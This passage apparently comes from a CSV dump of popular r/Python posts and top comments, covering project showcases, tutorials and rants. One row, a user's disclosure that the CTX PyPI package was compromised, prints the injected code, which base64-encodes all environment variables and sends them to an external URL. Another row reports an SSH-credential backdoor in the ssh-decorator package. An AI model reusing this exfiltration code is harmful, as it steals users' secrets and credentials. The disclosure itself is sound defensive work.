  [3.9 DataFrame `groupby()`](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-9-dataframe-groupby)  
  [3.10 Challenge: Hobbies](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-10-challenge-hobbies)  
  [3.11 Challenge: Party Time](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-11-challenge-party-time)  
  [3.12 Challenge: Vending Machines](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-12-challenge-vending-machines)  
  [3.13 Challenge: Cradle Robbers](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-13-challenge-cradle-robbers)  
  [3.14 Challenge: Pot Holes](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-14-challenge-pot-holes)  
4. **Advanced**  
  [4.1 Strings](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-1-strings)  
  [4.2 Dates And Times](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-2-dates-and-times)  
  [4.3 Categoricals](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-3-categoricals)  
  [4.4 MultiIndex](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-4-multiindex)  
  [4.5 DataFrame Reshaping](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-5-dataframe-reshaping)  
  [4.6 Challenge: Class Transitions](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-6-challenge-class-transitions)  
  [4.7 Challenge: Rose Thorn](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-7-challenge-rose-thorn)  
  [4.8 Challenge: Product Volumes](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-8-challenge-product-volumes)  
  [4.9 Challenge: Session Groups](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-9-challenge-session-groups)  
  [4.10 Challenge: OB-GYM](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-10-challenge-ob-gym)  
5. **Final Boss**  
  [5.1 Challenge: COVID Tracing](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-1-challenge-covid-tracing)  
  [5.2 Challenge: Pickle](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-2-challenge-pickle)  
  [5.3 Challenge: TV Commercials](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-3-challenge-tv-commercials)  
  [5.4 Challenge: Family IQ](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-4-challenge-family-iq)  
  [5.5 Challenge: Concerts](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-5-challenge-concerts)  

Alternatively, view my [YouTube playlist for the course here](https://www.youtube.com/playlist?list=PL9oKUrtC4VP7ry0um1QOUUfJBXKnkf-dA). 

If you find this useful, please consider liking, subscribing, and sharing. It means a lot. You wouldn't believe how much effort went into creating this course. 

Thanks!",I look forward to the next video series along the lines of “Python Matplotlib For Your 3rd Grade Kid”
I made a script that turns images into ASCII art,ehcyf6,2019-12-30 06:52:38,,No one's going to mention the image?
"Finally finished a Qt-based program to control the telescope at our observatory. The blue mark shows the telescope pointing, the purple one -- selected object",fy2xya,2020-04-10 07:18:48,,Don’t know what’s going on but looks awesome
"Do you know what a 5D cube is like? Let's rotate it in 5D, project to 3d and render it in 2D! (Things you can do with Python and POV-Ray)",gx67cu,2020-06-05 23:02:01,,What would a 4D cube look like? Or is that a nonsensical question for some reason?
txtai: AI-powered engine for contextual search and extractive question-answering,i8ygwi,2020-08-13 19:49:34,,This sounds very interesting! Could you tell what a new from a newspaper is about with this or it works the other way around only? You will need yo predifine some topics?
"From the Netflix series ""Family Business"". I rate it 10/10 for realism",c9xxes,2019-07-07 04:01:11,,they mention actual programming in a show and not a guy mashing a green screen? Damn
Using python to map the traffic that came to my server after my post hit the front page.,b9xcit,2019-04-06 06:07:06,,I’ve been following r/python for a long time just because I’ve been really interested in learning it and I knew seeing various posts would inspire me. There was something about seeing this that made me realize I do think data visualization is super cool and I think you just gave me the final push to get started! 
I just automated an actual job I have at work.,j1lk03,2020-09-29 05:38:34,"Spent 5 hours coding for what could have been hundreds of hours of work. I can't believe I actually did it. Lol

Of course I did it with the help of my google-fu but the fact that I was able to do it is such a great feeling of accomplishment. Received a ""Great Work!"" message from my boss too.


EDIT: HERE'S WHAT I DID. I kinda messed up not including this in the main post.

Basically I needed to make comparison of a new cloned server vs our old one.

It has hundreds if not thousand of tables that I'll need to do binary check sums of to ensure that the newly created servers and dbs are completely identical and that the etl procedures are loading the data correctly with the correct data types and values etc.

So without automation I'll have to do this hundreds if not thousands of times manually:

Run checksum code on old server then run on old server, save the checksum results on an excel worksheet as documentation if they or did not match.

What I did is I created a python automation program that gets a list of all tables in a db within a server, then iterates over all those tables and executes the binary check sum query again and again using the tables on a list then saves all the query result on a csv file. 

I appended the csv output names with the server name to make them distinct after every run. Then I load that csv to an excel file and then do the final IF comparisons there. 

So instead of doing that manual comparison for hundreds of hours, I was able to do it in 5 hours of coding and now runs for 30 second per database then voila, instant results. 

I'm so proud of this not gonna lie.",Cool! Any details you can share?
Here is an absolute Beginners Tutorial that can help you guys to get started with Machine learning. All you need is some basic knowledge of Python. You will have created two ML models at the end of this tutorial and also know the working of some ML algorithms.,i73sy4,2020-08-10 20:21:27,,"Can't wait to test it out, will definitely provide feedback, thanks!"
"Matplotlib can create plots in the xkcd art style, so you can create plots that look hand drawn.",dkhp09,2019-10-20 18:01:55,,"If anyone is interested, [here](https://github.com/Doometnick/xkcd-Style-Plots) the code for the graph.




Edit: [changed the font to Humor Sans](https://github.com/Doometnick/xkcd-Style-Plots/blob/master/img.png)"
This website has a searchable database of python modules shown as collapsible trees,f04cjn,2020-02-07 11:16:42,,Source:  [https://www.thrum.engineering/python-module-dependency-trees](https://www.thrum.engineering/python-module-dependency-trees)
Generating Geometric Birds,eqir9x,2020-01-19 00:50:46,,"Trying to replicate the style of [these designs](https://nytrami.design/graphic-design/classic-british-bird-illustrations/), but in a generative way. Work in progress, but pretty happy so far

Source code: https://github.com/erdavids/Birds-of-a-Feather

More projects: https://github.com/erdavids/Generative-Art"
"Be an absolute beginner at python: Check, have co-workers think I'm performing black magic : Check",l1ynlz,2021-01-21 21:41:28,"I work in an industry that is mainly manual work (think carpentry or similar). No-one going through the trade school learns anything on computers beyond making graphs in excel. 

I however always have had some interest in programming, so i took some free course a while back and try to find areas of my life where i can automate the boring stuff. I have very limited knowledge of any of the advanced functions, but i understand some of the basic logic.

For my job, i also have a computer because i oversee a large number of projects, every project gets a folder, an excel spreadsheet (a gantt chart for each project). 

I managed to make a script that asks for project number, checks of the folder is there, copies and modifies the cells of the excel sheet to the correct project number etc. I had to google almost everything, how do i folder scan? how do i manipulate excel? etc etc. 

They actually believe I performed black magic. 

Thank you Python for letting me look like an invaluable resource today ;)

[EDIT] thanks for all the awards! Happy my post inspired the discussion and the feeelz. Much love 💕",">I had to google almost everything, how do i folder scan? how do i manipulate excel? etc etc.

FYI, I'm a professional programmer with decades of experience.  Wrote my first line of code in 9th grade to automate my math homework.  Started getting paid to program in about 2002. Started picking up Python a few years ago.  I also have to google almost everything."
Create splash pages in less than 20 lines of python for free. Splashgen is an open source project,ngbiwa,2021-05-20 01:16:58,,"Here is an example repo using the project: [https://github.com/true3dco/splashgen.sh-site](https://github.com/true3dco/splashgen.sh-site)

If anyone needs help getting setup, let me know!"
I dislike Tkinter so I made a Drag-and-Drop Gui builder to make it less painful.,da8qdy,2019-09-28 08:06:44,,"All you have to do is pull it and run __main__.py

I like to think it’s intuitive and would love some feedback. It currently has support for Buttons, Dropdowns, InputFields, Labels, CheckButtons, SpinBoxs, and RadioButtons as well as Toplevels and scroll-frames/frames. 

It generates a directory full of code that’s written to run your application and you just fill in the logic. 

Button named “hi”

Generates 
def hi_button_fill(self):
    return “whatever the button should say” 

def hi_button_click(self):
    print(“you clicked me”) 

You have the power to do whatever you want. It just builds the GUI for you, and makes it resizable.

It’s built completely on builtins, so if you wanted to package your final product and turn it into a .exe that’s no problem. 

Build a GUI, save the project, Fill in the blanks for the logic. You’re done!

 [https://github.com/TristenHarr/MyPyBuilder](https://github.com/TristenHarr/MyPyBuilder)

Feedback appreciated! This took almost 100 hours to do, and it’s going to continue being improved and expanded on! I want to open-source it under an MIT license.

EDIT: This blew up. I was hoping people might take notice but I never expected this level of response! Thank you all so much for the encouragement! As of now I am hoping to expand the project and have ideas for a direction I want to take it. This is the first project I’ve ever written that I’ve actually shared, so I’m brand new to this. Anyone who has experience with open source software, or wants to contribute please message me!

EDIT: Detailed README is now up. Should explain just about everything you need to know to use this!"
I think the CTX package on PyPI has been hacked!,uwhzkj,2022-05-24 11:48:40,"There was a post here recently about an update to the CTX package. A simple package that allow you to access dictionary items using the dot notation (a_dict['key'] becomes a_dict.key). The post is [here](https://old.reddit.com/r/Python/comments/uumqmm/ctx_new_version_released_after_7_years_750k/) and OP was SocketPuppets

That package had not changed in 8 years. The OP said it was recently updated, and on PyPI it was updated as of May 21st. But the Github repo does not reflect any changes (it still 8 years old). When asked about it OP said it was copied to a corporate repo and that he would update the original repo. 

Out of curiosity I downloaded the source code from  PyPI and look what I found! **It seems like every time you create a dictionary it sends all your environment variables to a URL**. That's not kosher.  

        def __init__(self):
            self.sendRequest()
        .
        .  # code that performs dict access
        .  # please DO NOT RUN THIS CODE !

         def sendRequest(self):
            string = """"
            for _, value in environ.items():
                string += value+"" ""
    
            message_bytes = string.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')
    
            response = requests.get(""https://anti-theft-web.herokuapp.com/hacked/""+base64_message)


I'm not a professional python programmer, just a retired, old CS graduate. Can someone raise that up to the proper ""authorities"" please.

Thanks.","Nice due diligence /u/jimtk! 

I do have to warn everyone that we do not support harassment of any kind in this community, so I ask that while folks are welcome to criticize what was done, please don't attack or harass anyone."
I made a script that uses the mouse and keyboard to scan a grayscale image and replicates it in ms paint,cix5ek,2019-07-28 23:28:37,,What kind of *monster* uses a font that isn't monospaced‽
Learn Python in 2021 with these FREE Udemy Courses!,kouixi,2021-01-02 17:16:35," Learn Python, ethical hacking, web development and more with these 9 FREE Udemy courses! Happy new years! 😀

1. https://www.udemy.com/course/ethical-hacking-kali-linux/?couponCode=HAPPYNEWYEAR
2. https://www.udemy.com/course/ethical-hacking-python/?couponCode=HAPPYNEWYEAR
3. https://www.udemy.com/course/python-complete/?couponCode=EE03C893BA5B7A8127D1
4. https://www.udemy.com/course/front-end-web-development/?couponCode=HAPPYNEWYEAR
5. https://www.udemy.com/course/full-stack-javascript/?couponCode=HAPPYNEWYEAR
6. https://www.udemy.com/course/linux-system-admin/?couponCode=HAPPYNEWYEAR
7. https://www.udemy.com/course/python3-for-beginners/?couponCode=HAPPYNEWYEAR
8. https://www.udemy.com/course/google-chrome-extension/?couponCode=HAPPYNEWYEAR
9. https://www.udemy.com/course/ethical-hacking-professional/?couponCode=HAPPYNEWYEAR",![gif](giphy|tkApIfibjeWt1ufWwj)
Python in one?,ac3oj4,2019-01-03 16:17:46,,[Relevant XKCD](https://xkcd.com/353/) 
I made an Instagram Bot that downloads any video post you send to him and sends it back to you as mp4. Source Code will follow later https://instagram.com/instaadownload,ep8h1m,2020-01-16 05:08:10,,Awesome man!
Guido van Rossum joins Microsoft,jsyf3c,2020-11-13 01:06:10,,"So many negative comments. 

Why is it that people can’t see the positive sides of this ? Guido stepped down as BDFL when he retired. He has about as much say in python development as any of us (maybe a bit more), and if he can make Python easier to use  on Windows, how on earth will that harm anyone ?

VS Code already has pretty great python support, and MS recently released a new “more better” python language server for it. MS also has the money to fund some serious developer hours into the pain points of Python, you know the boring stuff nobody gets around to doing in their spare time."
I finished my Map Stylizer program! Repo in the comments,hil4qd,2020-06-30 18:55:46,,Upvote for the cool program. Comment for Pittsburgh!!
I made a Python Node editing IDE and it has saved me hours in development time and made my code ridiculously reusable,djk4vm,2019-10-18 15:41:42,,"Hello I am a math teacher in a french high school and i am really interested. Can i try the test version and next how can we buy licences of this software ?

Thank you a lot for this tool"
"Concept Art: what might python look like in Japanese, without any English characters?",hp7uqe,2020-07-11 18:29:54,,What's that `println` heresy on the right ?
In case you didn't know: Python 3.8 f-strings support = for self-documenting expressions and debugging,igq1pg,2020-08-26 09:59:10,"Python 3.8 added an `=` specifier to `f-strings`. An `f-string` such as `f'{expr=}'` will expand to the text of the expression, an equal sign, then the representation of the evaluated expression. 

**Examples:**

____

input:

    from datetime import date
    user = 'eric_idle'
    member_since = date(1975, 7, 31)
    f'{user=} {member_since=}'

output:

    ""user='eric_idle' member_since=datetime.date(1975, 7, 31)""

____

input:

    delta = date.today() - member_since
    f'{user=!s}  {delta.days=:,d}'

output *(no quotes; commas)*:

    'user=eric_idle  delta.days=16,075'

____

input:

    from math import cos,radians
    theta=30
    print(f'{theta=}  {cos(radians(theta))=:.3f}')

output:

    theta=30  cos(radians(theta))=0.866",f-strings is one of the best things for python 3
"I made this clock using python and as GUI html, css, JS",g6tiih,2020-04-24 03:49:33,,I cringe at the off-centered hands
I made a webcam to ascii converter with opencv,bvekft,2019-06-01 07:45:22,,"Here’s the source:
https://github.com/eebmagic/videoAscii

This is the first project that I’ve had enough confidence about to post here. I’d love any suggestions/constructive criticisms, especially for getting smoother output."
This beziez curve i've made,hi5s8f,2020-06-30 02:40:33,,"Love it! Using De Casteljau's algorithm I take it?

It just so happens that I've written an entire Bernstein/Bezier package for optimal trajectory generation and would be happy to share the GitHub link with you if you're interested."
"Today I’m releasing PyBoy v1.0.0! A Game Boy emulator written in Python, focused on scripting, AI and learning",g484d4,2020-04-19 22:01:05,"Back in 2015, it started as a university project. But I’ve kept working on it, and others have started contributing as well over the years. Today we thought it was time to officially release PyBoy v1.0.0 on PyPi and GitHub!

[https://github.com/Baekalfen/PyBoy](https://github.com/Baekalfen/PyBoy)

&#x200B;

https://reddit.com/link/g484d4/video/hd2yupa7bst41/player

[https://i.imgur.com/jEpnRRz.gifv](https://i.imgur.com/jEpnRRz.gifv)

## What is PyBoy

In short, it’s a Game Boy emulator written from scratch in pure Python, with additional support for scripting through an API. We’ve added type definitions, which allows us to compile the software using Cython to get performance comparable to emulators written in C and C++.

## Installation

The installation instructions are simple: Install SDL2 on your system, and install PyBoy through `pip install pyboy`. If you need to compile from source, we also have detailed instructions on the GitHub Wiki for Mac, Linux and Windows.

[https://github.com/Baekalfen/PyBoy/wiki/Installation](https://github.com/Baekalfen/PyBoy/wiki/Installation)

## Features

PyBoy is designed to be accessible from Python, so we support and encourage people who want to make experiments, bots or AI’s to try it out. We are building game-specific wrappers, which at the moment allows programmers to interface with Tetris and Super Mario Land, without any intricate knowledge of the Game Boy. Documentation can be found at: [https://docs.pyboy.dk](https://docs.pyboy.dk/) .

We also want to learn and experiment with more exotic features. Based on work from a university project, we’ve added rewinding to the emulator. Which means, you’ll be able to turn back time in any game.

&#x200B;

https://reddit.com/link/g484d4/video/zofcwc78bst41/player

[https://i.imgur.com/nr9VWwe.gifv](https://i.imgur.com/nr9VWwe.gifv)

## Feedback, Contribute, Learn

We’d love to hear your feedback, and see the projects you wish to use PyBoy for! We will do our best to make it happen.

Please give any feedback in the comments below, on our Discord server or create issues/pull-requests on GitHub if you wish.",We used your emulator for a company hackday. Thanks for all your work on this!
"Update! As promised, I made a website for the writing synthesis algorithm I wrote, It's fairly easy to use (Massively better than using the scripts itself). I hope it helps some of you to get your assignments done. Do try it out! Currently hosted on https://3c160834.ngrok.io (Link expires in 8 hrs)",g6apwp,2020-04-23 06:17:36,,"There are some major server issues, I'll fix them and get back to you with a new properly hosted link. Sorry for the inconvenience."
Understand your data with a few lines of code in seconds using DataPrep.eda,hlqnim,2020-07-06 01:40:37,,"Real-world data scientists often spend over 80% of their time on data preparation (data collection --> data understanding --> data cleaning --> data integration --> feature engineering). We believe that the main reason that data preparation takes a lot of human time is due to the lack of a good data preparation tool. Our vision is to build DataPrep ([http://dataprep.ai/](http://dataprep.ai/)), a fast and easy-to-use python library for data preparation to fill the gap. **You can think of DataPrep as ""scikit-learn"" for data preparation.**

&#x200B;

Currently, the library contains **DataPrep.data\_connector** to facilitate web data collection and **DataPrep.eda** to enable fast data understanding. More components (data cleaning, data integration, feature engineering) will be added in future releases.

&#x200B;

We really hope that you can download it (`pip install dataprep`) and give it a try. We will take your feedback very seriously and keep improving the library.

&#x200B;

Github Repository: [https://github.com/sfu-db/dataprep](https://github.com/sfu-db/dataprep)

Documents: [https://sfu-db.github.io/dataprep/index.html](https://sfu-db.github.io/dataprep/index.html)

More Video Demos: [https://www.youtube.com/channel/UC7OpZsQwWcmuD0SUaOjGBMA](https://www.youtube.com/channel/UC7OpZsQwWcmuD0SUaOjGBMA)"
I made c++-style printing in Python :P,duyjs7,2019-11-12 04:36:57,,We are going full circle- Creating high level languages so we can recreate the low levels
"Using only Python, I made a web dashboard to follow the coronavirus situation in Brazil",hjxqxr,2020-07-02 22:13:12,,Bom trabalho!
I made this script to find the optimal person to be traded for camels,fctk6e,2020-03-03 20:01:23,,"If you're in the camels market, you've probably heard of [this site](https://kamelrechner.eu/en/result), which allows you to find your boyfriend/girlfriend's worth in camel units.

As I wanted to find the ultimate person (that produces the highest number of camels) in the lowest number of requests to the server possible, I turned to the Bayesian Optimization algorithm using [hyperopt](https://github.com/hyperopt/hyperopt) (rather than a grid search or random search)*.*

As the site's camel-calculation function is unknown, this is a black-box optimization problem.

After maximizing the score for 5000 iterations, I got the following [result](https://user-images.githubusercontent.com/11351634/75630081-410ef780-5bf0-11ea-8dae-299e63c7bbcc.png) (106 camels) for this input:

    age: 26
    beard: middle
    body: muscle
    eyecolor: blue
    hair: middle
    haircolor: blonde
    height: 178

Link to GitHub: [https://github.com/OfirKP/CamelsOptimizer](https://github.com/OfirKP/CamelsOptimizer)"
I wrote a script that creates a password wordlist based on the information you provide about the person.,g3pjcs,2020-04-18 23:42:31,,Code: https://github.com/utpalbalse/PasswordListGenerator :)
Anyone else uses the Python interpreter as a calculator?,j6xdak,2020-10-08 03:18:54,It's just so comfy.,"Yes, and especially to do math with dates. Need to know what the date will be in 90 days? Easy:

    import datetime
    datetime.datetime.now() + datetime.timedelta(days=90)"
I was able to install and use Jupyter Notebook on my Android smartphone! (Through the terminal and without using root access),hhe1eb,2020-06-28 21:05:49,,lets keep this quiet i dont want my boss to know lmao
My school's business analytics course is taught in python. This is their textbook!,cxi7nd,2019-08-30 23:08:41,,"Hi, I'm the author of Python Crash Course. Thank you for sharing this. :)

When I started working on the book, I was teaching an introductory programming class for high school students. After a while I noticed that all the resources I tried to use either assumed too much about what students knew, or treated them like little kids. I decided to write a book that would simplify things as much as possible, but wouldn't speak down to people. The guiding question for writing the book was, ""What's the least you need to know about programming in order to start working on interesting projects?""

I hoped it would be appealing to anyone old enough to not want a kids' book. I had no idea how wide this range would really be. I've heard from people as young as upper elementary school, to people who are older and retired, and everyone in between. It's tremendously satisfying to have created something that works for such a wide audience. It's been particularly satisfying to hear from undergraduate and graduate students who have used PCC to supplement their more thorough, but much drier required texts. It's really interesting to see PCC becoming adopted as one of the required texts for a number of courses. I certainly did not expect to see that happen.

If you don't mind my asking, do you know what the syllabus looks like for the course? I would guess you'd work through the first half of the book, and then maybe do the data analysis projects?"
Using Python to find a prime number that looks like the python logo (or any other image) from far away [OC],c8s5ym,2019-07-04 03:07:11,,"How it's done:

We proceed in 5 steps:

1. We resize the image to contain at most a certain amount of pixels.
2. Run various image processing steps like edge enhancement and smoothing before converting the image into grey-scale (using Pillow)
3. We then quantise the image into just having 5 to 10 greyness levels.
4. Now we map each greyness level to a digit, et voila, we have embedded the  picture into a number.
5. It now remains to tweak some of the digits until we find a prime number that still looks like the image.

&#x200B;

*Note: According to the prime number theorem, the density of prime numbers is  asymptotically of order 1/log(n). Hence, if we have a number with m digits, the number of primality tests that we expect to do until we hit a prime number is roughly proportional to m. Since we use the Baillie–PSW primality test, the overall expected computational complexity of our prime searching procedure is O(n*log(n)³).

You can find the code @ [Github](https://github.com/LeviBorodenko/primify) and experiment yourself."
An Interactive Python Cheat Sheet That Brings The Answer To You,loxpv6,2021-02-21 22:05:25,"After realizing that I spent far too much time looking things up while coding, I decided to solve the problem and created this...

The Python SpeedSheet: [https://speedsheet.io/s/python](https://speedsheet.io/s/python)

It is an interactive cheat sheet that brings the answer to you. It is a really simple idea but it worked so well that it has become an indispensable tool for me any time I'm coding. Type in what you are looking for in the search bar and the speed sheet will display the answer.

It covers core Python only and I'm sure it is missing 'must have' items but I think it is still very useful.

To those of you viewing this on smaller screens, I apologize. I haven't had time to streamline the UI.

Here is a video to show you how it works:

[https://www.youtube.com/watch?v=66RumAF50\_4](https://www.youtube.com/watch?v=66RumAF50_4)

Try it out and let me know what you think.

TLDR:

This is an interactive cheat sheet for core Python.",Very useful. Great initiative👍
My 3D Shooter game using only pygame!,hwq8zs,2020-07-24 07:05:50,,"... WHA?

IMPRESSIVE! I've gotten a lot of use out of Pygame in my time, but I've never attempted anything like this. I love it.

To be fair, in practice, you'd want to write the rendering system as a C/C++ extension. The logic, you could do with python though."
I wrote a little python package to render images as continuous lines with varying thicknesses using matplotlib,en884v,2020-01-11 22:46:08,,source code here: [https://github.com/lucashadfield/speck](https://github.com/lucashadfield/speck)
I made a random maze generator,f17mfh,2020-02-09 19:45:01,,*heavy breathing in Minotaur*
I created the first cross-platform Python library to create native context menus!,gtzk7v,2020-05-31 22:06:48,,"You can check out the code here: [https://github.com/saleguas/context\_menu](https://github.com/saleguas/context_menu)

Easily the most painful thing I've ever created, but boy am I glad how it came out. There is little to none information on context menus anywhere, and a while ago I just wanted to create a simple file sorter and it was waaay harder then it should have been. So I decided to make this library so any other developers don't have to go through the pain I went through. Please give any and all feedback!"
"I used reinforcement learning with python to solve Numberphile's ""cat and mouse"" game!",cz50wq,2019-09-03 21:40:52,,"I saw the game that inspired this in [this Numberphile video](https://www.youtube.com/watch?v=vF_-ob9vseM). A post about the project is [here](https://www.declanoller.com/2019/08/30/solving-numberphiles-cat-and-mouse-puzzle-using-the-ddpg-and-a2c-reinforcement-learning-algorithms/), let me know if you have any feedback or questions!"
My experience learning Python as a c++ developer,gc691l,2020-05-02 21:13:13,"First off, Python is absolutely insane, not in a bad way, mind you, but it's just crazy to me. It's amazing and kind of confusing, but crazy none the less.

Recently I had to integrate Python as a scripting language into a large c++ project and though I should get to know the language first. And let me tell you, it's simply magical.

""I can add properties to classes dynamically? And delete them?"" ""Functions don't even care about the number of arguments?"" ""Need to do something? There's a library for that.""

It's absolutely crazy. And I love it. I have to be honest, the most amazing about this is how easy it is to embed.

I could give Python the project's memory allocator and the interpreter immediately uses the main memory pool of the project. I could redirect the interpreter's stdout / stderr channels to the project as well. Extending the language and exposing c++ functions are a breeze.

Python essentially supercharges c++.

Now, I'm not going to change my preference of c/c++ any time soon, but I just had to make a post about how nicely Python works as a scripting language in a c++ project. Cheers",Unfortunately this made me so lazy that i dont want to go back to C++
I just finished a 48 hour game jam using Python and Pygame! (Source in comments.),auh5ig,2019-02-25 12:53:31,,How recently did you play Hyper Light Drifter? 
Guys do not name your variable of type dictionary as myDict/mydict during your whiteboard interviews!,hq8zp2,2020-07-13 12:44:37,"Maybe I am the only idiot who has done something like this but I just wanted to share my embarrassing interview experience. Let's cut it to the chase, so I had this video interview where I was given a question and a shared editor.  I decided to use a dictionary for my solution (one of my favorite ds) and named the variable as myDict. While I was explaining my logic, I made sure I was emphasizing the letter 't' whenever I pronounced myDict (so that it doesn't sound like my\_dick). Anyway, while I was typing the solution and explaining, obviously, my brain started concentrating on the code and I wasn't paying much attention to what I was saying. Apparently, my pronunciation started sounding like 'my dick'. On top of that, I was using that dick so much to the point that interviewer started laughing. Imagine when you are explaining the space complexity and you say something along the lines 'the size of myDict is proportional to the size of input array'. Anyone else has done something embarrassing like this?

EDIT: embracing == embarrassing ",That's one way to get them to remember you.
"I made a coding interview site with video conferencing, collaborative code editing and remote code execution.",gv2dy5,2020-06-02 14:56:45,,"You can try it out [here](https://codeinterview.netlify.app).

It's also on my [GitHub](https://github.com/areebbeigh/codeinterview-backend).

[codeinterview-frontend](https://github.com/areebbeigh/codeinterview-frontend)

[codeinterview-sandbox](https://github.com/areebbeigh/codeinterview-sandbox)

Edit: Inserting related repositories."
Backdoor in ssh-decorator package,8hvzja,2018-05-08 19:37:20,"Do not install or use the [ssh\-decorator](https://pypi.org/project/ssh-decorate/#files) package from Pip. It has a backdoor inserted to steal all your SSH credentials. I've already contacted the developer to take it out. He hasn't responded so for now, use at your own risk! [https://ibb.co/kdDk67](https://www.linkedin.com/redir/redirect?url=https%3A%2F%2Fibb%2Eco%2FkdDk67&urlhash=SFzn&_t=tracking_anet)

**UPDATE:** The compromised package has been taken down now.

https://preview.redd.it/zu0guck3cmw01.png?width=819&format=png&auto=webp&s=91772cecb537bbac3c364af80c0a824a42714421","We always say “it’s open, it must be ok otherwise someone would notice”. The truth is though that it’s thanks to people like you who take the effort to go through cose and report bad stuff that we can work safely 

Thanks man! "
Made my first fractal,eazg05,2019-12-15 22:20:07,,"Looks nice.

I've just had a look on your code and have to say it looks nicely organised and is easily readable. Kudos to you for writing it like that.

Two little suggestions, if you don't mind:

- Consider using a `if __name__ == ""__main__""` block to initialise your script when it's run directly
- Consider using tuples for your ~~vel_list~~ vel_table as they are immutable

Both of those definitely not necessary, just things to think about. :)

Best wishes"
an error in my code makes the Mandelbrot set look even cooler,e4js7g,2019-12-02 00:44:28,,"This could be mathematically interesting. What did you do? What causes those pillar structures, but maintains the shape of the set? What are those 'scratches' cut out of the set? I have so many questions."
"[RANT] Clients telling me ""I know python"" is a major red flag to me",jm9dnh,2020-11-02 04:27:49,"I do freelance python development in mainly web scraping, automation, building very simple Flask APIs, simple Vue frontend and more or less doing what I like to call ""general-purpose programming"".

Now, I am reasonably skilled in python, I believe. Don't write OOP and class-based python unless I am doing more than 100 lines of code. Most often write pretty simple stuff but most of the time goes into problem-solving.

But I despise freelancing. 1 out of every 3 comments/posts I make on Reddit is how much I hate doing freelancing. I come to Reddit to vent so I am sorry to the fellas who is reading this because they are more or less my punching bag :( I am sorry sir/madam. I am just having a bad life, it will end soon.

So, today I am going to rant about one of the more """"fun"""" things of freelancing, client telling me they know python.

Whenever a client tells me that they know python, I try to ignore them but often times I have to entertain the idea anyway because jobs are scarce. I keep telling myself ""maybe this will work out great"" but it doesn't.

It never goes right. Here is the thing. If you do what I do you will realize the code is often quite simple. Most of the effort goes into problem-solving. So when the client sees the code and me getting paid by the hour, ""They are like I thought you are *best darn python developer* I could have written that myself!""

My immediate impulse is to go on a rant and call that person something rotten. But I have to maintain ""professionalism"".

Then there is the issue of budgeting. I do fixed payment contracts for smaller engagements. But oftentimes these python experts will quote me something that is at least one-fourth of a reasonable budget. And by reasonable I mean non-US reasonable budget which is already one-fifth of a reasonable US programming project budget. But anyway they quote that because they know how is easy it is to do my job.

There is more because this is rant by the way. So, clients with python knowledge will say to me ""I have this python file..."" which is the worst thing to say at this point. They think they have done the ""majority"" of the work. But here is the way I see it-

a. Either they have just barely scratched the surface
b. They have a jumbled up mess
c. They had another dev look into the project who already failed
d. They had to do a ""code review"" of their previous freelancer and they ended up stealing the code

There is no positive way to imagine this problem. I have seen too much crappy code and too much of arguments like ""they had done the work for me, so I should charge near to nothing"".

People don't know exactly why senior devs get paid so much money. Junior devs write code, senior devs review code. That is why they get paid more. Making sense of other people's code is a risky and frustrating thing and it could be incredibly time-consuming. And moreover in most cases building upon a codebase is more difficult than writing it from the scratch.

Doctors rant about ""expert"" patients earning their MDs from WebMD and I am seeing the exact same thing happen to me with clients knowing how to write loops in python.

Python is easy to learn, programming these days is easy to learn. But people are not paying programmers for writing loops and if statements. They are paying them to solve problems. Knowing the alphabet doesn't make you a poet. And yes in my eyes programming is poetry.","TL;DR -- Knowing syntax doesn't mean you are a replacement for hiring a skilled programmer, or should talk down to said hired skilled programmer.

Knowing syntax helps, but the logic in programs is where the heavy-lifting is."
I made a raytracer in Python from scratch!,gcra5c,2020-05-03 22:14:07,,"... show-off

Fine, maybe it's better than my rock, paper, scissors."
I made a Backtracking Algorithm Visualizer in Python with Pygame as my very first personal project!,hyxwlh,2020-07-28 02:30:53,,"Very nice, i also wanted to do that for a long time!   
How long have you been working on it?"
"""The rules of perf"" at Dropbox",eip48b,2020-01-02 06:50:48,,"A more detailed explanation:

1. Avoid needless processing. This breaks down two ways
   1. **Feature design:** Think hard before adding features that come with significant performance impacts -- do you really need this feature?  Is there a simpler way to do it which achieves most of your goals?  Can you do it a simple way 90% of the time and only fall back to something more complex if needed? Can you skip several intermediate steps to get to the end result faster? (ex avoiding sorting a list)
   2. **Optimize execution** by taking advantage of short-circuit evaluation and doing lazy fetching/evaluation.  For conditionals, if you sometimes need to do an expensive check, but *usually* don't, then see if there's a way you can skip that check.  Laziness: don't fetch extra things from the filesystem until requested, if you often don't need it.
      1. Practical example: I optimized a routine (in Python) at work last month.  We were processing text files a line at a time and removing control characters.   To remove control characters we used a regex on each line (not the most efficient approach, fairly expensive).  I added a quick check that iterated through the line of text and checked if any of the characters were within the control character range,and just returned the original string if not.  Not as efficient as rolling a non-regex implementation, but since control characters are rare it avoids 90% of the performance cost and was much simpler & safer to implement.
2. [Cache](https://en.wikipedia.org/wiki/Cache_(computing)) results of expensive operations to avoid repeating them unnecessarily.  If you're fetching info from the filesystem, cache it in memory if you are likely to reuse it (works well with lazy evaluation).
3. Batch it: if you're doing a single operation often to many items, try gathering up the items to process and processing them in large groups.  Often this is more efficient because it makes better use of caches (CPU/disk) and it permits you to write much tighter loops for processing. It permits reusing buffers, connections, SQL prepared statements, etc.  It can improve branch prediction, permit use of SIMD instructions, etc where they would not work otherwise.
